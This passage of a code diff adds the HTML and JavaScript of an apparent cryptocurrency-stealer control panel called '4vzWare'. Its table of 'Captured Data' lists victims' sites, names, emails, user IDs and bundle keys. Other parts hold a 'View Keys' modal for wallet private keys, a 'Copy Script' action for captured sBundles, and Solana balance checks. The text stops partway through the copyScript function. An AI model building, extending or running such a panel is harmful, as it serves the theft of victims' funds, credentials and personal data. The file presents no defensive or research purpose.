@@ -1,0 +1,1757 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>4vzWare</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            color: #ffffff;
+            min-height: 100vh;
+            overflow-x: hidden;
+            margin: 0;
+            padding: 0;
+        }
+
+        .background-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -2;
+        }
+
+        .video-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: -1;
+        }
+
+        .header {
+            padding: 16px 24px;
+            background: #0a0b0d;
+            border-bottom: 1px solid #1a1d21;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 18px;
+            font-weight: 800;
+        }
+
+        .logo::before {
+            content: "";
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23ffffff'%3E%3Cpath d='M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z'/%3E%3C/svg%3E") no-repeat center;
+            background-size: contain;
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 15px;
+        }
+
+        .btn {
+            padding: 8px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 32px;
+            height: 32px;
+            position: relative;
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(255, 192, 203, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(255, 182, 193, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 50% 50%, rgba(255, 105, 180, 0.1) 0%, transparent 50%),
+                transparent;
+            border: 1px solid #4b5563;
+            overflow: hidden;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(1px 1px at 8px 8px, rgba(255, 192, 203, 0.5), transparent),
+                radial-gradient(1px 1px at 20px 12px, rgba(255, 182, 193, 0.4), transparent),
+                radial-gradient(1px 1px at 15px 20px, rgba(255, 105, 180, 0.3), transparent);
+            opacity: 0.3;
+            pointer-events: none;
+        }
+
+        .btn:hover {
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(255, 192, 203, 0.2) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(255, 182, 193, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 50% 50%, rgba(255, 105, 180, 0.15) 0%, transparent 50%),
+                #4b5563;
+            transform: translateY(-1px);
+        }
+
+        .btn:hover::before {
+            opacity: 0.5;
+        }
+
+        .btn svg {
+            width: 16px;
+            height: 16px;
+            fill: #d1d5db;
+            transition: fill 0.2s ease;
+        }
+
+        .btn:hover svg {
+            fill: #ffffff;
+        }
+
+        .btn-primary svg {
+            fill: #d1d5db;
+        }
+
+        .btn-primary {
+            background: transparent;
+            border-color: #4b5563;
+        }
+
+        .btn-primary:hover {
+            background: #4b5563;
+            border-color: #4b5563;
+        }
+
+        .btn-danger {
+            background: transparent;
+            border-color: #4b5563;
+        }
+
+        .btn-danger:hover {
+            background: #4b5563;
+            border-color: #4b5563;
+        }
+
+        .btn-danger svg {
+            fill: #d1d5db;
+        }
+
+        .btn-success {
+            background: transparent;
+            border-color: #4b5563;
+        }
+
+        .btn-success:hover {
+            background: #4b5563;
+            border-color: #4b5563;
+        }
+
+        .btn-success svg {
+            fill: #d1d5db;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            border-color: #4b5563;
+        }
+
+        .tooltip {
+            position: absolute;
+            bottom: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #000000;
+            color: #ffffff;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            white-space: nowrap;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.2s ease, visibility 0.2s ease;
+            z-index: 1000;
+            margin-bottom: 5px;
+        }
+
+        .tooltip::after {
+            content: '';
+            position: absolute;
+            top: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            border-left: 5px solid transparent;
+            border-right: 5px solid transparent;
+            border-top: 5px solid #000000;
+        }
+
+        .btn:hover .tooltip {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 24px;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .stat-card {
+            background: #111827;
+            border: 1px solid #1f2937;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            transition: all 0.2s ease;
+        }
+
+        .stat-card:hover {
+            border-color: #374151;
+        }
+
+        .stat-number {
+            font-size: 32px;
+            font-weight: 800;
+            color: #ffffff;
+            margin-bottom: 8px;
+        }
+
+        .stat-label {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+        }
+
+        .table-container {
+            background: #111827;
+            border: 1px solid #1f2937;
+            border-radius: 8px;
+            overflow: hidden;
+            margin-top: 24px;
+        }
+
+        .table-header {
+            padding: 16px 20px;
+            background: #0f172a;
+            border-bottom: 1px solid #1e293b;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .table-title {
+            font-size: 20px;
+            font-weight: 800;
+            color: #ffffff;
+        }
+
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .data-table th {
+            background: #0f172a;
+            padding: 12px 16px;
+            text-align: left;
+            font-weight: 600;
+            color: #9ca3af;
+            border-bottom: 1px solid #1e293b;
+            font-size: 13px;
+        }
+
+        .data-table td {
+            padding: 12px 16px;
+            border-bottom: 1px solid #1f2937;
+            color: #d1d5db;
+            font-size: 14px;
+        }
+
+        .data-table tr:hover {
+            background: #1f2937;
+        }
+
+        .json-view {
+            background: #0f172a;
+            border: 1px solid #374151;
+            border-radius: 4px;
+            padding: 6px 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            max-width: 200px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            color: #9ca3af;
+        }
+
+        .status-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+
+        .status-success {
+            background: #10b981;
+        }
+
+        .status-warning {
+            background: #f59e0b;
+        }
+
+        .status-error {
+            background: #ef4444;
+        }
+
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background: #1a1a1a;
+            border: 1px solid #333333;
+            border-radius: 8px;
+            padding: 0;
+            max-width: 90vw;
+            width: 800px;
+            max-height: 90vh;
+            overflow: hidden;
+            position: relative;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 20px;
+            border-bottom: 1px solid #333333;
+            background: #1a1a1a;
+        }
+
+        .modal-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #ffffff;
+            margin: 0;
+        }
+
+        .modal-close {
+            background: none;
+            border: none;
+            color: #888888;
+            font-size: 20px;
+            cursor: pointer;
+            padding: 4px;
+            border-radius: 4px;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 24px;
+            height: 24px;
+        }
+
+        .modal-close:hover {
+            background: #333333;
+            color: #ffffff;
+        }
+
+        .modal-body {
+            padding: 20px;
+            overflow-y: auto;
+            max-height: calc(80vh - 60px);
+        }
+
+        .wallet-item {
+            background: #0f0f0f;
+            border: 1px solid #2a2a2a;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 16px;
+            transition: all 0.2s ease;
+        }
+
+        .wallet-item:hover {
+            border-color: #444444;
+        }
+
+        .wallet-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .wallet-success {
+            border-color: #2a2a2a;
+        }
+
+        .wallet-error {
+            border-color: #4a2a2a;
+            background: #1a0f0f;
+        }
+
+        .key-section {
+            margin-bottom: 16px;
+        }
+
+        .key-section:last-child {
+            margin-bottom: 0;
+        }
+
+        .key-label {
+            font-size: 12px;
+            font-weight: 500;
+            color: #888888;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .key-display {
+            background: #0a0a0a;
+            border: 1px solid #333333;
+            border-radius: 6px;
+            padding: 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            word-break: break-all;
+            color: #cccccc;
+            position: relative;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            line-height: 1.4;
+        }
+
+        .key-display:hover {
+            border-color: #555555;
+        }
+
+        .key-display.blurred {
+            filter: blur(4px);
+            user-select: none;
+        }
+
+        .key-display-with-copy {
+            position: relative;
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            background: #333333;
+            border: none;
+            color: #888888;
+            padding: 4px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            opacity: 0;
+        }
+
+        .key-display:hover .copy-btn {
+            opacity: 1;
+        }
+
+        .copy-btn:hover {
+            background: #444444;
+            color: #ffffff;
+        }
+
+        .copy-btn svg {
+            width: 12px;
+            height: 12px;
+            fill: currentColor;
+        }
+
+        .wallet-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #2a2a2a;
+        }
+
+        .wallet-number {
+            font-size: 14px;
+            font-weight: 600;
+            color: #ffffff;
+        }
+
+        .wallet-status-icon {
+            width: 16px;
+            height: 16px;
+        }
+
+        .copy-notification {
+            position: fixed;
+            top: 30px;
+            right: 30px;
+            background: #10b981;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 6px;
+            z-index: 1001;
+            display: none;
+            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
+        }
+
+        .video-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 16px;
+            margin-top: 20px;
+        }
+
+        .video-option {
+            background: #0f0f0f;
+            border: 2px solid #2a2a2a;
+            border-radius: 8px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            position: relative;
+        }
+
+        .video-option:hover {
+            border-color: #4a5568;
+            transform: scale(1.02);
+        }
+
+        .video-option.selected {
+            border-color: #10b981;
+            box-shadow: 0 0 20px rgba(16, 185, 129, 0.3);
+        }
+
+        .video-preview {
+            width: 100%;
+            height: 140px;
+            object-fit: cover;
+            display: block;
+        }
+
+        .video-info {
+            padding: 12px;
+            text-align: center;
+        }
+
+        .video-title {
+            color: #ffffff;
+            font-weight: 600;
+            margin-bottom: 4px;
+            font-size: 14px;
+        }
+
+        .video-description {
+            color: #888888;
+            font-size: 12px;
+        }
+
+        .selected-indicator {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            background: #10b981;
+            color: white;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            transition: opacity 0.2s ease;
+        }
+
+        .video-option.selected .selected-indicator {
+            opacity: 1;
+        }
+
+        .settings-section {
+            margin-bottom: 24px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #333333;
+        }
+
+        .settings-section:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+        }
+
+        .settings-title {
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .save-btn {
+            background: 
+                radial-gradient(circle at 25% 25%, rgba(255, 255, 255, 0.2) 0%, transparent 50%),
+                radial-gradient(circle at 75% 75%, rgba(255, 192, 203, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 50% 10%, rgba(255, 182, 193, 0.2) 0%, transparent 50%),
+                #10b981;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.2s ease;
+            margin-top: 20px;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .save-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(2px 2px at 30px 15px, rgba(255, 255, 255, 0.7), transparent),
+                radial-gradient(2px 2px at 60px 20px, rgba(255, 255, 255, 0.6), transparent),
+                radial-gradient(3px 3px at 90px 18px, rgba(255, 255, 255, 0.5), transparent),
+                radial-gradient(2px 2px at 45px 25px, rgba(255, 255, 255, 0.6), transparent);
+            opacity: 0.3;
+            pointer-events: none;
+        }
+
+        .save-btn:hover {
+            background: 
+                radial-gradient(circle at 25% 25%, rgba(255, 255, 255, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 75% 75%, rgba(255, 192, 203, 0.4) 0%, transparent 50%),
+                radial-gradient(circle at 50% 10%, rgba(255, 182, 193, 0.3) 0%, transparent 50%),
+                #059669;
+            transform: translateY(-1px);
+        }
+
+        .save-btn:hover::before {
+            opacity: 0.5;
+        }
+
+        .theme-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px;
+            margin-top: 20px;
+        }
+
+        .theme-option {
+            background: #0f0f0f;
+            border: 2px solid #2a2a2a;
+            border-radius: 8px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            position: relative;
+        }
+
+        .theme-option:hover {
+            border-color: #4a5568;
+            transform: scale(1.02);
+        }
+
+        .theme-option.selected {
+            border-color: #10b981;
+            box-shadow: 0 0 20px rgba(16, 185, 129, 0.3);
+        }
+
+        .theme-preview {
+            width: 100%;
+            height: 100px;
+            position: relative;
+            background: linear-gradient(45deg, #111827, #374151);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .theme-preview::before {
+            content: 'UI Preview';
+            color: #ffffff;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .default-preview {
+            background: linear-gradient(45deg, #111827, #374151);
+        }
+
+        .transparent-preview {
+            background: linear-gradient(45deg, rgba(17, 24, 39, 0.6), rgba(55, 65, 81, 0.6));
+            backdrop-filter: blur(10px);
+        }
+
+        .theme-info {
+            padding: 12px;
+            text-align: center;
+        }
+
+        .theme-title {
+            color: #ffffff;
+            font-weight: 600;
+            margin-bottom: 4px;
+            font-size: 14px;
+        }
+
+        .theme-description {
+            color: #888888;
+            font-size: 12px;
+        }
+
+        /* Transparent theme styles */
+        body.transparent-theme .header {
+            background: transparent;
+            backdrop-filter: blur(3px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        body.transparent-theme .stat-card {
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(3px);
+        }
+
+        body.transparent-theme .table-container {
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(3px);
+        }
+
+        body.transparent-theme .table-header {
+            background: transparent;
+            backdrop-filter: blur(3px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        body.transparent-theme .data-table th {
+            background: transparent;
+            backdrop-filter: blur(3px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        body.transparent-theme .data-table tr:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        body.transparent-theme .modal-content {
+            background: transparent;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        body.transparent-theme .modal-header {
+            background: transparent;
+            backdrop-filter: blur(5px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        body.transparent-theme .wallet-item {
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(3px);
+        }
+
+        body.transparent-theme .key-display {
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(3px);
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 768px) {
+            .header {
+                padding: 15px 20px;
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .container {
+                padding: 20px;
+            }
+
+            .stats-grid {
+                grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+                gap: 15px;
+            }
+
+            .data-table {
+                font-size: 14px;
+            }
+
+            .data-table th,
+            .data-table td {
+                padding: 10px 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <video class="background-video" autoplay muted loop id="backgroundVideo">
+        <source src="https://r2.guns.lol/db4d56f0-b5a8-4e40-a0ee-bc5d5e27b7ae.mp4" type="video/mp4">
+    </video>
+    <div class="video-overlay"></div>
+    
+    <div class="copy-notification" id="copyNotification">
+        ✅ Copied to clipboard!
+    </div>
+
+    <header class="header">
+        <div class="logo">
+            X-X
+        </div>
+        <div class="header-actions">
+            <button class="btn btn-danger" onclick="logout()">
+                <svg viewBox="0 0 24 24">
+                    <path d="M16,17V14H9V10H16V7L21,12L16,17M14,2A2,2 0 0,1 16,4V6H14V4H5V20H14V18H16V20A2,2 0 0,1 14,22H5A2,2 0 0,1 3,20V4A2,2 0 0,1 5,2H14Z"/>
+                </svg>
+                <div class="tooltip">Logout</div>
+            </button>
+            <button class="btn btn-primary" onclick="openSettingsModal()">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12,15.5A3.5,3.5 0 0,1 8.5,12A3.5,3.5 0 0,1 12,8.5A3.5,3.5 0 0,1 15.5,12A3.5,3.5 0 0,1 12,15.5M19.43,12.97C19.47,12.65 19.5,12.33 19.5,12C19.5,11.67 19.47,11.34 19.43,11.03L21.54,9.37C21.73,9.22 21.78,8.95 21.66,8.73L19.66,5.27C19.54,5.05 19.27,4.96 19.05,5.05L16.56,6.05C16.04,5.66 15.5,5.32 14.87,5.07L14.5,2.42C14.46,2.18 14.25,2 14,2H10C9.75,2 9.54,2.18 9.5,2.42L9.13,5.07C8.5,5.32 7.96,5.66 7.44,6.05L4.95,5.05C4.73,4.96 4.46,5.05 4.34,5.27L2.34,8.73C2.22,8.95 2.27,9.22 2.46,9.37L4.57,11.03C4.53,11.34 4.5,11.67 4.5,12C4.5,12.33 4.53,12.65 4.57,12.97L2.46,14.63C2.27,14.78 2.22,15.05 2.34,15.27L4.34,18.73C4.46,18.95 4.73,19.03 4.95,18.95L7.44,17.94C7.96,18.34 8.5,18.68 9.13,18.93L9.5,21.58C9.54,21.82 9.75,22 10,22H14C14.25,22 14.46,21.82 14.5,21.58L14.87,18.93C15.5,18.68 16.04,18.34 16.56,17.94L19.05,18.95C19.27,19.03 19.54,18.95 19.66,18.73L21.66,15.27C21.78,15.05 21.73,14.78 21.54,14.63L19.43,12.97Z"/>
+                </svg>
+                <div class="tooltip">Settings</div>
+            </button>
+            <button class="btn btn-primary" onclick="toggleVideoSound()" id="soundToggleBtn">
+                <svg viewBox="0 0 24 24" id="soundIcon">
+                    <path d="M14,3.23V5.29C16.89,6.15 19,8.83 19,12C19,15.17 16.89,17.85 14,18.71V20.77C18.01,19.86 21,16.28 21,12C21,7.72 18.01,4.14 14,3.23M16.5,12C16.5,10.23 15.5,8.71 14,7.97V16C15.5,15.29 16.5,13.76 16.5,12M3,9V15H7L12,20V4L7,9H3Z"/>
+                </svg>
+                <div class="tooltip">Toggle Sound</div>
+            </button>
+            <button class="btn btn-success" onclick="checkBalances()" id="checkBalanceBtn">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M12,4A8,8 0 0,1 20,12A8,8 0 0,1 12,20A8,8 0 0,1 4,12A8,8 0 0,1 12,4M12.5,7V12.25L17,14.92L16.25,16.15L11,13V7H12.5Z"/>
+                </svg>
+                <div class="tooltip">Check Balances</div>
+            </button>
+            <button class="btn btn-primary" onclick="location.reload()">
+                <svg viewBox="0 0 24 24">
+                    <path d="M17.65,6.35C16.2,4.9 14.21,4 12,4A8,8 0 0,0 4,12A8,8 0 0,0 12,20C15.73,20 18.84,17.45 19.73,14H17.65C16.83,16.33 14.61,18 12,18A6,6 0 0,1 6,12A6,6 0 0,1 12,6C13.66,6 15.14,6.69 16.22,7.78L13,11H20V4L17.65,6.35Z"/>
+                </svg>
+                <div class="tooltip">Refresh</div>
+            </button>
+            <a href="/" class="btn btn-secondary">
+                <svg viewBox="0 0 24 24">
+                    <path d="M20,11V13H8L13.5,18.5L12.08,19.92L4.16,12L12.08,4.08L13.5,5.5L8,11H20Z"/>
+                </svg>
+                <div class="tooltip">Back to Home</div>
+            </a>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="stats-grid" id="statsGrid">
+        </div>
+        
+        <div id="balanceResults" style="display: none;" class="table-container">
+            <div class="table-header">
+                <div class="table-title" style="display: flex; align-items: center; gap: 10px;">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="#ffffff">
+                        <path d="M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M12,4A8,8 0 0,1 20,12A8,8 0 0,1 12,20A8,8 0 0,1 4,12A8,8 0 0,1 12,4M12.5,7V12.25L17,14.92L16.25,16.15L11,13V7H12.5Z"/>
+                    </svg>
+                    Solana Balance Check Results
+                </div>
+                <div class="header-actions">
+                    <button class="btn btn-danger" onclick="hideBalanceResults()">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z"/>
+                        </svg>
+                        <div class="tooltip">Close</div>
+                    </button>
+                </div>
+            </div>
+            
+            <div id="balanceSummary" style="padding: 20px; background: #0f172a; border-bottom: 1px solid #1e293b;"></div>
+            
+            <div style="overflow-x: auto;">
+                <table class="data-table">
+                    <thead>
+                        <tr>
+                            <th>Entry ID</th>
+                            <th>Wallet #</th>
+                            <th>Public Key</th>
+                            <th>SOL Balance</th>
+                            <th>USD Value</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="balanceTableBody">
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <div class="table-container">
+            <div class="table-header">
+                <div class="table-title" style="display: flex; align-items: center; gap: 10px;">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="#ffffff">
+                        <path d="M22,21H2V3H4V19H6V17H10V19H12V16H16V19H18V17H22V21M16,15H12V8H16V15M10,15H6V12H10V15Z"/>
+                    </svg>
+                    Captured Data
+                </div>
+                <div class="header-actions">
+                    <span id="totalEntries" style="color: rgba(255, 255, 255, 0.7);"></span>
+                </div>
+            </div>
+            
+            <div style="overflow-x: auto;">
+                <table class="data-table">
+                    <thead>
+                        <tr>
+                            <th>Status</th>
+                            <th>Timestamp</th>
+                            <th>Site</th>
+                            <th>User</th>
+                            <th>Wallets</th>
+                            <th>Bundle Key</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="dataTableBody">
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let bookmarkData = [];
+
+        async function loadData() {
+            try {
+                const response = await fetch('/api/bookmark-data');
+                bookmarkData = await response.json();
+                renderStats();
+                renderTable();
+            } catch (error) {
+                console.error('Error loading data:', error);
+            }
+        }
+
+        function renderStats() {
+            const statsGrid = document.getElementById('statsGrid');
+            const totalEntries = bookmarkData.length;
+            const last24Hours = bookmarkData.filter(item => 
+                new Date(item.timestamp) > new Date(Date.now() - 24*60*60*1000)
+            ).length;
+            const uniqueSites = new Set(bookmarkData.map(item => item.site)).size;
+            const uniqueUsers = new Set(bookmarkData.map(item => item.user?.id || item.user?.userId).filter(Boolean)).size;
+            const withSBundles = bookmarkData.filter(item => item.sBundles && item.sBundles !== 'null').length;
+            const totalWallets = bookmarkData.reduce((total, item) => total + (item.processedSBundles?.count || 0), 0);
+
+            statsGrid.innerHTML = `
+                <div class="stat-card">
+                    <div class="stat-number">${totalEntries}</div>
+                    <div class="stat-label">Total Entries</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number">${last24Hours}</div>
+                    <div class="stat-label">Last 24 Hours</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number">${uniqueSites}</div>
+                    <div class="stat-label">Unique Sites</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number">${uniqueUsers}</div>
+                    <div class="stat-label">Unique Users</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number">${withSBundles}</div>
+                    <div class="stat-label">With sBundles</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number">${totalWallets}</div>
+                    <div class="stat-label">Total Wallets</div>
+                </div>
+            `;
+
+            document.getElementById('totalEntries').textContent = `${totalEntries} entries`;
+        }
+
+        function renderTable() {
+            const tbody = document.getElementById('dataTableBody');
+            tbody.innerHTML = bookmarkData.map(item => {
+                const sBundlesCount = item.processedSBundles?.count || 0;
+                const hasError = item.processedSBundles?.wallets?.some(w => w.error);
+                const statusClass = sBundlesCount > 0 ? (hasError ? 'status-warning' : 'status-success') : 'status-error';
+                
+                return `
+                    <tr>
+                        <td>
+                            <span class="status-indicator ${statusClass}"></span>
+                            ${sBundlesCount > 0 ? (hasError ? 'Partial' : 'Success') : 'No Data'}
+                        </td>
+                        <td>${new Date(item.timestamp).toLocaleString()}</td>
+                        <td>
+                            <a href="${item.site}" target="_blank" style="color: #ffffff; text-decoration: none;">
+                                ${item.site.length > 30 ? item.site.substring(0, 30) + '...' : item.site}
+                            </a>
+                        </td>
+                        <td>
+                            <div>${item.user?.name || item.user?.email || 'N/A'}</div>
+                            <div style="font-size: 12px; color: rgba(255,255,255,0.5);">
+                                ${item.user?.userId || item.user?.id || 'N/A'}
+                            </div>
+                        </td>
+                        <td style="text-align: center;">
+                            <span style="color: ${sBundlesCount > 0 ? '#4caf50' : '#666'}; font-weight: bold;">
+                                ${sBundlesCount}
+                            </span>
+                        </td>
+                        <td>
+                            <div class="json-view" title="${item.bundle || 'N/A'}">
+                                ${(item.bundle || 'N/A').length > 20 ? (item.bundle || 'N/A').substring(0, 20) + '...' : (item.bundle || 'N/A')}
+                            </div>
+                        </td>
+                        <td>
+                            <div style="display: flex; gap: 8px;">
+                                <button class="btn btn-danger" onclick="deleteEntry(${item.id})">
+                                    <svg viewBox="0 0 24 24">
+                                        <path d="M19,4H15.5L14.5,3H9.5L8.5,4H5V6H19M6,19A2,2 0 0,0 8,21H16A2,2 0 0,0 18,19V7H6V19Z"/>
+                                    </svg>
+                                    <div class="tooltip">Delete</div>
+                                </button>
+                                ${item.sBundles && item.sBundles !== 'null' ? `
+                                <button class="btn btn-primary" onclick="copyScript(${item.id})">
+                                    <svg viewBox="0 0 24 24">
+                                        <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
+                                    </svg>
+                                    <div class="tooltip">Copy Script</div>
+                                </button>` : ''}
+                                ${item.processedSBundles?.wallets ? `
+                                <button class="btn btn-success" onclick="viewWallets(${item.id})">
+                                    <svg viewBox="0 0 24 24">
+                                        <path d="M21,18V19A2,2 0 0,1 19,21H5C3.89,21 3,20.1 3,19V5A2,2 0 0,1 5,3H19A2,2 0 0,1 21,5V6H20A2,2 0 0,0 18,8V16A2,2 0 0,0 20,18M20,8V16H22V8A2,2 0 0,0 20,6V8Z"/>
+                                    </svg>
+                                    <div class="tooltip">View Keys</div>
+                                </button>` : ''}
+                                <button class="btn btn-secondary" onclick="viewFullData(${item.id})">
+                                    <svg viewBox="0 0 24 24">
+                                        <path d="M14,3V5H17.59L7.76,14.83L9.17,16.24L19,6.41V10H21V3M19,19H5V5H12V3H5C3.89,3 3,3.9 3,5V19A2,2 0 0,0 5,21H19A2,2 0 0,0 21,19V12H19V19Z"/>
+                                    </svg>
+                                    <div class="tooltip">Details</div>
+                                </button>
+                            </div>
+                        </td>
+                    </tr>
+                `;
+            }).join('');
+        }
+
+        async function deleteEntry(id) {
+            if (confirm('Are you sure you want to delete this entry?')) {
+                try {
+                    const response = await fetch(`/api/bookmark-data/${id}`, {
+                        method: 'DELETE'
+                    });
+                    const result = await response.json();
+                    if (result.success) {
+                        await loadData();
+                    } else {
+                        alert('Failed to delete entry');
+                    }
+                } catch (error) {
+                    alert('Error deleting entry: ' + error.message);
+                }
+            }
+        }
+
+        function copyScript(id) {
+            const entry = bookmarkData.find(item => item.id === id);
+            if (!entry || !entry.sBundles) {
+                alert('No sBundles data found for this entry');
+                return;
+            }
